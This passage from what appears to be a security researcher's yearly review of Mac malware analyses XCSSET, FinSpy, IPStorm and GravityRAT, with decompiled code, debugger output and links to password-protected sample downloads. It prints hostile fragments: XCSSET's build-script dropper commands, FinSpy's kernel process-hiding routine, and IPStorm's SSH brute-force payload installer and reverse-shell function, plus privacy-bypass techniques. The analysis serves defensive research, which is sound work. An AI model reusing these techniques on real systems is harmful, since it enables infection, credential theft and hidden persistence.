Platform\"](https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/)\n\n## üëæ OSX.XCSSET\n\nXCSSET is rather unique, as it targets macOS developers (Xcode users) and leverages\nseveral 0days to steal passwords and exfiltrate data.\n\n\n-----\n\n[Download: OSX.XCSSET (password:](https://objective-see.com/downloads/malware/XCSSET.zip) `infect3d )`\n\nIn July, I noticed that Apple‚Äôs XProtect update (v. 2126) had added a new signature for a\nsample Cupertino named `MACOS.2070d41 :`\n\nApple's XProtect update (v2126) contains a new signature: \"MACOS.2070d41\"\n\nLooks for compiled AppleScript, w/ strings such as \"curl --connect-timeout 10 -ks -d\"\n\n0 hits on [@virustotal :(](https://twitter.com/virustotal?ref_src=twsrc%5Etfw) [@AppleSupport, can you share info/hashes w/ others looking to](https://twitter.com/AppleSupport?ref_src=twsrc%5Etfw)\nhelp protect macOS users? üôÉ [pic.twitter.com/LQhxeqmT3z](https://t.co/LQhxeqmT3z)\n\n[‚Äî patrick wardle (@patrickwardle) July 14, 2020](https://twitter.com/patrickwardle/status/1282860187397746689?ref_src=twsrc%5Etfw)\n\n[‚Ä¶in wasn‚Äôt till August, when TrendMicro researchers released their report on (and IoCs for)](https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/)\n```\nOSX.XCSSET that we learned more about this intriguing malware.\n\n```\n\"We have discovered an unusual infection related to Xcode developer projects. Upon\nfurther investigation, we discovered that a developer‚Äôs Xcode project at large contained\nthe source malware [OSX.XCSSET], which leads to a rabbit hole of malicious\npayloads.\" -TrendMicro\n\nTrendMicro‚Äôs technical analysis of OSX.XCSSET is incredibly detailed and thorough. If\nyou‚Äôre interested in more details about this malware, it‚Äôs a must read:\n\n\"XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other\nBrowsers, Leverages Zero-day Exploitss\"\n\n**Writeups:**\n\n[‚ÄúMac malware exposed: XCSSET, an advanced new threat‚Äù](https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/)\n\n[‚ÄúWhat is OSX.XCSSET malware and what should I do about it?‚Äù](https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/)\n\n\n-----\n\nXCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari,\nOther Browsers, Leverages Zero-day Exploits‚Äù\n\n**Infection Vector: (user-downloaded) Xcode Projects**\n\nXcode is the de-facto IDE for developing software for Apple devices (iOS, macOS, etc.). It\nappears that `OSX.XCSSET was originally discovered hiding within various developer‚Äôs`\nXcode projects. Several of these infected projects were found/hosted online (on Github).\n\nIf an XCSSET-infected Xcode project is downloaded and built, the malicious code will be\nautomatically run and the developer‚Äôs Mac will be infected.\n\nTrendMicro explains:\n\n\"This threat primarily spreads via Xcode projects... It is not yet clear how the threat\ninitially enters these systems. Presumably, these systems would be primarily used by\ndevelopers. These Xcode projects have been modified such that upon building, these\nprojects would run a malicious code.\n\nThis eventually leads to the main XCSSET malware being dropped and run on the\naffected system. Infected users are also vulnerable to having their credentials,\naccounts, and other vital data stolen.\" -TrendMicro\n\nExamining an Xcode project infected with `OSX.XCSSET, reveals a script in the project‚Äôs`\n```\nproject.pbxproj file that executes another script ( Assets.xcassets ) from a hidden\n\n```\ndirectory ( .xcassets/ ):\n\nmalicious build script in an OSX.XCSSET-infected Xcode project\nTaking a peek at this `Assets.xcassets script, reveals it executes a binary named`\n```\nxcassets ‚Ä¶which is the core component of the malware:\n\n```\n\n-----\n\n```\n1cd ${PROJECT_FILE_PATH}/xcuserdata/.xcassets/ \n2xattr -c \"xcassets\"\n3chmod +x \"xcassets\"\n4./xcassets \"${PROJECT_FILE_PATH}\" true%\n\n```\nAs noted, building the infected project will trigger the execution of the script(s).\n\nFor readers interested in the specifics of OSX.XCSSET‚Äôs Xcode project subversion\n(infection), see TrendMicro‚Äôs report (pp. 1-4):\n\n\"XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other\nBrowsers, Leverages Zero-day Exploitss\"\n\n**Persistence: None(?)**\n\nIt appears that `OSX.XCSET does not persist, but rather relies on the user triggering both the`\ninitial infection and (subsequent) re-executions of the malware ‚Ä¶for example building an\ninfected Xcode project, or running one of the applications it modifies.\n\nHowever, due to the primary goals of the malware (credential stealing and file exfiltration),\nthere may be no need, nor advantage, to the malware persisting.\n\nIn terms of application modifications (which can lead to ‚Äúpersistence‚Äù via user interactions),\n```\nOSX.XCSSET modifies (references) Safari (not the actual Safari.app which would\n\n```\ninvalidate the code signature).\n\n[The TrendMicro report notes:](https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf)\n\n\"This is done so that when the infected user wants to open the normal Safari browser,\nthe fake one will get executed instead.\n\n...functionally, this means that the fake Safari browser runs instead of the legitimate\nversion of Safari.\" -TrendMicro\n\nIt should also be noted that several of the malware‚Äôs modules reference launch agent\nproperty lists ‚Ä¶property lists that are likely related to the malware. For example (as noted by\nTrendMicro) the `remove_old module, ‚Äúremoves ‚Ä¶`\n```\n~/Library/LaunchAgents/com.apple.core.launchd.plist ‚Äù while the cleaner\n\n```\nmodule ‚Äúremoves `~/Library/LaunchAgents/com.apple.core.accountsd.plist ‚Äù`\n\n‚Ä¶thus some versions/variants of the `OSX.XCSSET may persist via normal mechanisms (e.g.`\nlaunch agents).\n\n\n-----\n\n**Capabilities: Credential Stealing, Data Exfiltration, Ransomware, Viral Replication**\n\n...and more!\n\nOne of the main goals of `OSX.XCSSET` is to steal credentials and exfiltrate data from user\napplications.\nA [writeup by Intego notes:](https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/)\n\n\"XCSSET attempts to steal passwords from victims‚Äô Apple ID, Google, Paypal, and\nother accounts. ...[the malware] also attempts to exfiltrate data from apps such as\nApple Notes, Evernote, Skype, Telegram, and WeChat\" -Intego\n\nIt should be noted that on recent versions of macOS, malware is are prevented from\naccessing various user/system files, unless the user has manually granted the application\n‚ÄúFull Disk Access‚Äù (via the System Preferences application).\n\nTo work around this privacy mechanism, `OSX.XCSSET leverages (what were) two 0day`\nexploits:\n\nExploit 0x1:\n...bypass Full Disk Access via SSHD to access (protected) Safari cookies üç™\n[pic.twitter.com/NW4mfStmzh](https://t.co/NW4mfStmzh)\n\n[‚Äî patrick wardle (@patrickwardle) August 14, 2020](https://twitter.com/patrickwardle/status/1294167251008942081?ref_src=twsrc%5Etfw)\n\nThe first vulnerability (implemented in the malware‚Äôs `safari_cookie module) abuses the`\nfact that Full Disk Access is granted to the `ssh service. The malware simply (ab)uses` `scp`\nto ‚Äúconnect‚Äù to the system it‚Äôs running on ( username@localhost ) and copy protected files\n(e.g. Safari‚Äôs binary cookie file).\n\nFor more details on this exploit, see\n\n[\"The vulnerability in Remote Login (ssh) persists\".](https://eclecticlight.co/2020/08/20/the-vulnerability-in-remote-login-ssh-persists/)\nThe second vulnerability involves leverages `SafariForWebKitDevelopment :`\n\nAlso, Dylib Hijacking!? üòç [pic.twitter.com/jk48UmystT](https://t.co/jk48UmystT)\n\n[‚Äî patrick wardle (@patrickwardle) August 14, 2020](https://twitter.com/patrickwardle/status/1294168301510119425?ref_src=twsrc%5Etfw)\n\nAs noted in a Jamf [writeup on the malware:](https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/)\n\n\"The second exploit leverages a developer specific tool. If the device doesn‚Äôt already\nhave the SafariForWebKitDevelopment component installed, the malware goes and\ndownloads it. With this, it can utilize Safari‚Äôs extensive capabilities without being\nhindered by the usual sandbox.\" -Jamf\n\n\n-----\n\n‚Ä¶in order to gain code execution within the context of Apple s\n```\nSafariForWebKitDevelopment binary, the malware (ab)uses the DYLD_FRAMEWORK_PATH\n\n```\nand `DYLD_LIBRARY_PATH environment variables:`\n\nOSX.XCSSET's dylib injection (credit: TrendMicro)\nOnce loaded within the (developer version of) Safari, the malicious code (JavaScript) can be\ndownloaded and executed without being constrained by normal browser restrictions. This\nallows it manipulate browser results, as well as steal credentials from various sites of\ninterest.\n\nThe combination of these two exploits is rather potent, and allows `OSX.XCSSet perform its`\ncredential stealing and data exfiltration actions quite effectively:\n\n\"XCSSet effectively has all the tools it needs to run arbitrary code and touch every file\non the system, neatly sidestepping the strong defenses in macOS.\" -Jamf\n\nAnd what if the user doesn‚Äôt have Safari? Well as Intego notes:\n\n‚ÄúAnd just in case the victim doesn‚Äôt use Safari, XCSSET also has the capability of installing\nTrojanized versions of many other Mac browsers: Google Chrome, Mozilla Firefox, Microsoft\nEdge, Brave, Opera, 360 (a Chinese browser), and Yandex (a Russian browser).‚Äù\n\nBesides credential / data stealing, `OSX.XCSSET supports a myriad of other capabilities`\n[(implemented via payload modules). The TrendMicro report summarizes the plugins (and](https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf)\ntheir capabilities). Some notable plugins, mentioned in the report include:\n\n\n-----\n\n```\n   screen :\n\n```\nTakes screenshots of an infected system.\n```\n   encrypter :\n\n```\nEncrypts (ransoms) users files (via AES in CBC mode).\n```\n   replicator :\n\n```\nInfects local Xcode projects with its malicious code.\n\n## üëæ OSX.FinSpy\n\nFinSpy is commercial cross-platform implant, supporting a myriad of cyber espionage\nfeatures & capabilities.\n\n[Download: OSX.FinSpy (password:](https://objective-see.com/downloads/malware/FinSpy.zip) `infect3d )`\n\nThe malware was discovered by Amnesty International, as seen in the tweet by Claudio\nGuarnieri, their ‚ÄúHead of Security Lab‚Äù:\n\nSometimes threat intel is hard, sometimes folks leave all FinFisher samples exposed\non a webserver. So here ya go, along with recent Windows and Android, we're\npublishing details on new FinFisher for Mac OS üçé and Linux\n[üêß.https://t.co/eakdBWcYbF](https://t.co/eakdBWcYbF)\n\n[‚Äî nex (@botherder@mastodon.social) (@botherder) September 25, 2020](https://twitter.com/botherder/status/1309449600110129152?ref_src=twsrc%5Etfw)\n\nTitled, ‚ÄúGerman-made FinSpy spyware found in Egypt, and Mac and Linux versions\nrevealed,‚Äù the Amnesty International writeup detailed FinFisher‚Äôs spyware suite (FinSpy),\nincluding ‚Äúpreviously undisclosed versions for Linux and MacOS computers‚Äù\n\nAs noted in their report:\n\n\n-----\n\nFinSpy is a commercial spyware suite produced by the Munich-based company\nFinFisher Gmbh. Since 2011 researchers have documented numerous cases of\ntargeting of Human Rights Defenders (HRDs) - including activists, journalists, and\ndissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE,\nand more.\"\n\n**Writeups:**\n\n[‚ÄúFinFisher Filleted üêü‚Äù](https://objective-see.com/blog/blog_0x4F.html)\n\n[‚ÄúThe Finfisher Tales, Chapter 1: The dropper‚Äù](https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/)\n\n[‚ÄúGerman-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed‚Äù](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\n**Infection Vector: Unknown**\n\nAmnesty International uncovered ‚Äúa server located at the IP address 158.69.105[.]207‚Äù ‚Ä¶\nhosting various FinSpy samples, including a macOS variant:\n\n\n-----\n\nFinSpy Server (credit: Amnesty International)\nUnfortunately there was no clear indication how (macOS) targets were infected.\n\nCommercial spyware is often sold to customers, who are then responsible for figuring out\nhow to deploy the software to (read: infect) targets of interest.\n\nSuch customers may (separately) purchase exploits, or craft their own social engineering\ncampaigns to compromise their targets.\n\nHowever, we should note that the malware was distributed as disk image, containing a single\nitem: an application bundle named `Install √áaƒülayan :`\n\n\n-----\n\n/Volumes/caglayan-macos/Install √áaƒülayan.app\n‚Ä¶with a bundle identifier of `com.coverpage.bluedome.caglayan.desktop.installer :`\n```\n$ cat \"/Volumes/caglayan-macos/Install √áaƒülayan.app/Contents/Info.plist\"\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n  <dict>\n    <key>CFBundleExecutable</key>\n    <string>Install √áaƒülayan</string>\n    <key>CFBundleIdentifier</key>\n    <string>com.coverpage.bluedome.caglayan.desktop.installer</string>\n    ...\n  </dict>\n</plist>\n\n```\nThis may indicate that the malware was distributed as a trojanized application or perhaps\nwas attempting to masquerade as a legitimate application (perhaps for the Turkish news(?)\nsite, √áaƒülayan ( caglayandergisi.com )).\n\n**Persistence: Launch Agent**\n\nIf the malicious application ( Install √áaƒülayan.app ) is run, it will eventually execute an\ninstaller (that was copied to `~/Library/Caches/org.logind.ctp.archive/installer ).`\n\n[As noted in the Amnesty writeup, this installer performs three actions:](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\n\n-----\n\n1. Copies plugins and config files to `/Library/Frameworks/Storage.framework .`\n2. Copies the launcher ( logind ) to `/private/etc/logind .`\n3. Persists the launcher, by creating a launch agent plist:\n```\n   /System/Library/LaunchAgents/logind.pslist .\n\n```\nLet‚Äôs take a closer look at it now, to highlight the code responsible for these actions.\n\nThe `org.logind.ctp.archive/installer is a Mach-O binary, rather similar (albeit`\nsimpler) than its parent, `.log/ARA0848.app/Contents/MacOS/installer . (For example,`\nboth contain a custom `GIFileOps class that implements various file related methods`\n( copy: to:, `loadAgent, etc.).`\n\nThis (next stage) installer‚Äôs main method starts at `0x000000010a3d95ac . The logic the the`\n```\nmain function first checks for the presence of various files (plugins?), such as\n/Library/Frameworks/Storage.framework,\n/Contents/Resources/7f.bundle/Contents/Resources/AAC.dat . It then builds a\n\n```\ndictionary of key-value pairs via a call to `[GIPath installationMap] :`\n```\n$ lldb org.logind.ctp.archive/installer\n...\n* thread #1, queue = 'com.apple.main-thread'\ninstaller`main:\n-> 0x10a3da37e : callq *0x6d04(%rip) ;objc_msgSend\n(lldb) x/s $rsi\n0x10a3df5c7: \"installationMap\"\n(lldb) ni\n(lldb) po $rax\n{\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/Storage.framework\"\n   ‚Üí \"/Library/Frameworks/Storage.framework\";\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/logind\"\n   ‚Üí \"/private/etc/logind\";\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext\"\n   ‚Üí \"/System/Library/Extensions/logind.kext\";\n  \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist\"\n   ‚Üí \"/Library/LaunchAgents/logind.plist\";\n}\n\n```\nAs we can see in the debugger output, this maps files from the decrypted uncompressed\narchive ( org.logind.ctp.archive ) to their final destinations.\n\n\n-----\n\nThe installer then iterates over each of these files, and via a block (at\n```\n0x000000010a3da4d2 ) moves them from the archive to their (final) destinations:\n1files = [GIPath installationMap];\n2[files enumerateKeysAndObjectsUsingBlock:(void (^)(KeyType src, ObjectType dest,\nBOOL *stop))\n3{\n4\n5  [GIFileOps move:src to:dest];\n6  [GIFileOps setStandardAttributes:dest];\n7\n8}];\n\n```\n[We can passively observe this via our File Monitor:](https://objective-see.com/products/utilities.html#FileMonitor)\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter installer\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/Library/LaunchAgents/logind.plist\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist\"\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/private/etc/logind\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind\"\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/System/Library/Extensions/logind.kext\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext\"\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/Library/Frameworks/Storage.framework\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/storage.framework\"\n }\n}\n\n```\nLet‚Äôs take a closer look at the `logind.plist :`\n\n\n-----\n\n```\n$ cat /Library/LaunchAgents/logind.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>org.logind</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/private/etc/logind</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <dict>\n        <key>SuccessfulExit</key>\n        <false/>\n    </dict>\n</dict>\n</plist>\n\n```\nAs the `RunAtLoad key is set to` `true, the binary,` `/private/etc/logind will be`\nautomatically (re)executed each time the system is rebooted an the user logs in.\n\nOnce the installer has, well, installed (and setuid‚Äôd) these various components, it kicks off\nthis persistent launch agent via a call to `[GIFileOps loadAgent:]`\n\nThis method simply invokes `launchctl with the` `load command line argument, and path`\nto the `logind.plist to:`\n```\n 1+(char)loadAgent:(char *)plist {\n 2  \n 3  task = [[NSTask alloc] init];\n 4  [task setLaunchPath:@\"/bin/launchctl\"];\n 5  args = [NSArray arrayWithObjects:@\"load\", plist, 0x0];\n 6  [r15 setArguments:args];\n 7\n 8  [task launch];\n 9  [task waitUntilExit];\n10  ...\n11}\n\n```\nThe persistent implant ( /private/etc/logind ), is now off and running!\n\n**Capabilities: Persistent Implant with plugin-based modules and a kernel-level rootkit**\n\nAmnesty‚Äôs [writeup details the capabilities of](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/) `FinSpy, noting such capabilities are`\nimplemented via plugins:\n\n\n-----\n\nFinSpy for Mac OS ...follow(s) a modular design. The launcher logind only\ninstantiates the core component `dataPkg`, which oversees communications with the\nCommand and Control server (C&C), and decrypting/launching modules when needed.\nThe modules are encrypted with the AES algorithm and compressed with the `aplib`\ncompression library. The AES key is stored in the binary, but the IV is stored in each\nconfiguration file along with a MD5 hash of the final decompressed file.\"\n\nThe rather extensive list of modules available to the spyware include:\n\nAnother interesting capability of this malware is its kernel-mode rootkit functionality. Simply\nput, (public) macOS malware with ring-0 capabilities is rare!\n\nThe file `logind.kext is` `FinSpy ‚Äôs kernel extension ‚Ä¶though it is unsigned:`\n```\n$ codesign -dvv org.logind.ctp.archive/logind.kext/Contents/MacOS/logind \nlogind.kext/Contents/MacOS/logind: code object is not signed at all\n\n```\nAs the kernel extension is unsigned, it won‚Äôt run on any recent version of macOS (which\nenforce kext code signing requirements).\n\nIt terms of it‚Äôs functionality, it appears to be a simple process hider.\n\nIn a function named `ph_init, the kernel extension looks up a bunch of kernel symbols (via`\na function named `ksym_resolve_symbol_by_crc32 ):`\n\n\n-----\n\n```\n 1void ph_init() {\n 2\n 3  rax = ksym_resolve_symbol_by_crc32(0x127a88e8, rsi, rdx, rcx);\n 4  *_ALLPROC_ADDRESS = rax;\n 5\n 6  ...\n 7\n 8  rax = ksym_resolve_symbol_by_crc32(0xfffffffffef1d247, rsi, rdx, rcx);\n 9  *_LCK_LCK = rax;\n10  if (rax != 0x0) \n11    *_LCK_LCK = *rax;\n12\n13  ...\n14  \n15  rax = ksym_resolve_symbol_by_crc32(0x392ec7ae, rsi, rdx, rcx);\n16  *_LCK_MTX_LOCK = rax;\n17  if (rax != 0x0) \n18    *_LCK_MTX_UNLOCK = ksym_resolve_symbol_by_crc32(0x2472817c, rsi, rdx, rcx);\n19  \n20\n21  return;\n22}\n\n```\nBased on variable names, it appears that `logind.kext is attempting to resolve the pointer`\nof the kernel‚Äôs global list of `proc (process) structures, as well as various locks.`\n\nIn a function named `ph_hide the kext will hide a process. This is done by walking the list of`\n```\nproc structures (pointed to by _ALLPROC_ADDRESS ), and looking for the one that matches\n\n```\n(to hide):\n\n\n-----\n\n```\n 1void _ph_hide(int arg0) {\n 2  \n 3  r14 = arg0;\n 4  if (r14 == 0x0) return;\n 5\n 6  r15 = *_ALLPROC_ADDRESS;\n 7  if (r15 == 0x0) goto return;\n 8\n 9SEARCH:\n10\n11  rax = proc_pid(r15);\n12  rbx = *r15;\n13  if (rax == r14) goto HIDE;\n14\n15loc_15da:\n16  r15 = rbx;\n17  if (rbx != 0x0) goto SEARCH;\n18\n19  return;\n20\n21HIDE:\n22  r14 = *(r15 + 0x8);\n23  (*_LCK_MTX_LOCK)(*_LCK_LCK);\n24  *r14 = rbx;\n25  *(rbx + 0x8) = r14;\n26  (*_LCK_MTX_UNLOCK)(*_LCK_LCK);\n27  return;\n28}\n\n```\nIn the above code, note that `HIDE contains the logic to remove the target process of`\ninterest, by unlinking it from the (process) list. Once removed, the process is now (relatively)\n‚Äúhidden‚Äù. (Of course one can leverage XNU level APIs to uncover such process hiding).\n\nThe malicious kext also appears to be able to communicate with user-mode via the file\n```\n/tmp/launchd-935.U3xqZw . Specifically, in a function named ksym_init, it will open and\n\n```\nread in the contents of this file (which may contain details of the process to hide?):\n\n\n-----\n\n```\n 1void ksym_init(int arg0, int arg1) {\n 2  *(int32_t *)_MKI_SIZE = fileio_get_file_size(\"/tmp/launchd-935.U3xqZw\", arg1);\n 3  rax = _OSMalloc_Tagalloc(\"MKI\", 0x0);\n 4  *_MKI_TAG = rax;\n 5  if (rax == 0x0) goto .l1;\n 6\n 7loc_1898:\n 8  rax = _OSMalloc(*(int32_t *)_MKI_SIZE, rax);\n 9  *_MKI_BUFFER = rax;\n10  if (rax == 0x0) goto loc_1921;\n11\n12loc_18b2:\n13  if (fileio_read_file_fully(\"/tmp/launchd-935.U3xqZw\", rax) == 0x0) goto\nloc_1908;\n14\n15  ....\n16}\n\n```\nFor more on the topic of Mac rootkits, see:\n\n[\"Revisiting Mac OS X Kernel Rootkits\"](http://phrack.org/issues/69/7.html)\n\n## üëæ IPStorm\n\nIPStorm is a cross platform botnet, now ported to macOS. Though it‚Äôs capabilities are limited\non macOS, it support a reverse shell, ad faud, and more.\n\n[Download: IPStorm (password:](https://objective-see.com/downloads/malware/IPStorm.zip) `infect3d )`\n\n[In early October researchers a Intezer published a report about IPStorm being ported from](https://www.intego.com/mac-security-blog/gravityrat-and-ipstorm-mac-malware-ported-from-windows/)\nWindows to Linux‚Ä¶and also macOS:\n\n\"Our research team recently identified new Linux variants of IPStorm targeting various\nLinux architectures (ARM, AMD64, Intel 80386) and platforms (servers, Android, IoT).\nWe have also detected a macOS variant.\" -Intezer\n\n\n-----\n\nThe macOS version of IPStorm is packed with the UPX packer. Luckily we can use UPX\nitself (via the `-d flag) to completely unpack the malware:`\n```\n$ ./upx -d IPStorm \n            Ultimate Packer for eXecutables\n             Copyright (C) 1996 - 2013\nUPX 3.09    Markus Oberhumer, Laszlo Molnar & John Reiser  Feb 18th 2013\nWith LZMA support, Compiled by Mounir IDRASSI (mounir@idrix.fr)\n    File size     Ratio   Format   Name\n  --------------------  ------  -----------  ---------- 20172924 \n\n```\n‚Ä¶once unpacked, analysis can commence.\n\n**Writeups:**\n\n[‚ÄúA Storm is Brewing: IPStorm Now Has Linux Malware‚Äù](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)\n\n[‚ÄúGravityRAT and IPStorm: Mac Malware, Ported from Windows‚Äù](https://www.intego.com/mac-security-blog/gravityrat-and-ipstorm-mac-malware-ported-from-windows/)\n\n**Infection Vector: SSH Brute Forcing(?)**\n\nIt is not clear how `IPStorm infects macOS systems. However, the Intezer` [report notes that](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)\nthe malware can spread via SSH brute-forcing:\n\n\"The [malware] attempts to spread and infect other victims on the internet by using\nSSH brute-force. Once a connection is established ...it will proceed to download the\npayload and infect the server.\" -Intezer\n\nAt address `00000000046e70b0 we find a function named` `storm/scan_tools/ssh.brute`\n‚Ä¶that if successfully brute-forces a SSH connection on a remote system will call\n```\nstorm/scan_tools/ssh.InstallPayload . This function will ascertain the architecture of\n\n```\nthe (newly) accessed system (via a call to `storm/scan_tools/ssh.SystemInfo.GoArch ),`\nand the proceeds to download the appropriate payload (via\n```\nstorm/statik.GetFileContents ).\n\n```\nOnce the payload has been downloaded to the remote system, `IPStorm invokes a function`\nnamed `ssh.(*Session).Start ‚Ä¶which eventually calls` `runtime.newproc to (likely)`\nkick off the payload on th remote system.\n\n\n-----\n\n```\n1int ssh.InstallPayload(...) {\n2 \n3 ssh.SystemInfo.GoArch(...);\n4\n5 statik.GetFileContents(...);\n6\n7 ssh.(*Session).Start(...);\n8\n9}\n\n```\n**Persistence: None(?)**\n\nWhile the Windows and Linux versions of `IPStorm will persist, it does not appear that the`\nmacOS version supports persistence.\n\nThe Intezer [report details a function in the Linux variant,](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/) `filetransfer.(*File).Persist`\nthat, ‚Äúarchives persistence‚Äù.\n\nWe find this same function in the macOS version (at address `0x004491620 ) ‚Ä¶however it`\ndoes not appear to contain any persistence logic, but instead references the string\n```\n\"Persist not implemented on platform %s\" :\n1;filetransfer.(*File).Persist\n2...\n3lea  rax, qword [0x4910358] ;\"Persist not implemented on platform %s\"\n\n```\nMoreover executing the malware (in a virtual machine) does not generate any persistent\nevents.\n\n**Capabilities: Remote Shell, Ad Faud, etc...**\n\n[During their analysis of the Linux variant, the Intezer researchers noted that](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/) `IPStorm would`\ncreate a reverse shell via functions named `backshell.* .`\n\nWe find these same functions in the macOS variant:\n\n\n-----\n\nbackshell.* functions\nTaking a peek at the `backshell.openLocalShell function reveals it invoking`\n```\npowershell.(*Backend).StartProcess ‚Ä¶passing in bash\n1int storm/backshell.openLocalShell(...) {\n2  ...\n3\n4  //0x48ed0be -> \"bash\"\n5  storm/powershell.(*Backend).StartProcess(..., 0x48ed0be, ...);\n6\n7}\n\n```\n[Looking at sockets on an infected system (via our tool Netiquette), we find that the malware](https://objective-see.com/products/netiquette.html)\nhas created a listening socket on a high port:\n\n\n-----\n\nListening Socket\n‚Ä¶this might indicate that the malware creates a listener socket in process to facilitate the\nreverse shell (and perhaps passes the commands then to `bash to execute).`\n\nIn the Intezer [report, the researches noted that the Linux version of](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/) `IPStorm also engages`\nin fraudulent activities:\n\n\"IPStorm‚Äôs Linux variant takes advantage of its being widespread to perform different\nfraudulent activity in the background, abusing gaming and ads monetization. Because\nit‚Äôs a botnet, the malware utilizes the large amount of requests from different trusted\nsources, thus not being blocked nor traceable.\" -Intezer\n\nBy sniffing network traffic we can confirm that the macOS variant also engages in such\nactivities ‚Ä¶specifically fraudulent ad monetization:\n\n\n-----\n\nFraudulent Ad Monetization\n‚Ä¶to a large number of remote IP addresses (though some may be other members of the\nbotnet, or SSH brute-force attempts):\n\nSo ... Many ... Connections\n\n## üëæ GravityRat\n\nGravityRat is cross-platform remote administration tool (RAT ‚Ä¶backdoor) now ported to\nmacOS. The (available) samples, are persistent first-stage downloaders.\n\n\n-----\n\n[Download: GravityRAT (password:](https://objective-see.com/downloads/malware/GravityRAT.zip) `infect3d )`\n\n[In October, Kaspersky published a new report on the intriguing cross-platform spyware,](https://securelist.com/gravityrat-the-spy-returns/99097/)\n```\nGravityRAT (\"used to target the Indian armed forces\"). In this report, they noted that for the\n\n```\nfirst time, ‚Äúthere are now versions for ‚Ä¶macOS‚Äù.\n\nThe Kaspersky repprt mentioned several samples (of trojanized applications) that were all\npersistent first-stage downloaders.\n```\n$ shasum OSX.GravityRAT/*\n086b22075d464b327a2bcbf8b66736560a215347 ~/OSX.GravityRAT/Enigma\n696c7cbba2c9326298f3ddca5f22cfb20a4cd3ee ~/OSX.GravityRAT/OrangeVault\ne33894042f3798516967471d0ce1e92d10dec756 ~/OSX.GravityRAT/StrongBox\n9b5b234e3b53f254bc9b3717232d1030e340c7f2 ~/OSX.GravityRAT/TeraSpace\n\n```\n‚Ä¶here, we‚Äôll focus mainly on the `Enigma sample`\n( 086b22075d464b327a2bcbf8b66736560a215347 ) and `StrongBox sample`\n( e33894042f3798516967471d0ce1e92d10dec756 ).\n\n**Writeups:**\n\n[‚ÄúGravityRAT: The spy returns‚Äù](https://securelist.com/gravityrat-the-spy-returns/99097/)\n\n[‚ÄúAdventures in Anti-Gravity (Part 1)‚Äù](https://objective-see.com/blog/blog_0x5B.html)\n\n[‚ÄúAdventures in Anti-Gravity (Part 2)‚Äù](https://objective-see.com/blog/blog_0x5B.html)\n\n**Infection Vector: Trojanized Applications**\n\nKaspersky‚Äôs [report notes that (at least one sample of) the Windows versions was](https://securelist.com/gravityrat-the-spy-returns/99097/)\n‚Äúdownloaded from the site enigma.net[.]in under the guise of a secure file sharing app to\n_protect against ransomware‚Äù. The macOS version ( Enigma ) also appears to masquerade_\n\n\n-----\n\nas such an application:\n\nEnigma's user\n\ninterface\nIt‚Äôs unknown how the user is coerced into downloading and running the trojaned application,\nbut it they do - they may end up infected.\n\n‚Ä¶may, as the sample(s) are unsigned:\n```\n$ for i in OSX.GravityRAT/*; do codesign -dvvv $i; done\nOSX.GravityRAT/Enigma: code object is not signed at all\nOSX.GravityRAT/OrangeVault: code object is not signed at all\nOSX.GravityRAT/StrongBox: code object is not signed at all\nOSX.GravityRAT/TeraSpace: code object is not signed at all\n\n```\n‚Ä¶meaning that on recent version of macOS (Gatekeeper) will block them (unless the user\nmanually removes the quarantine attribute, or if distirbuted in a .pkg, clicks through 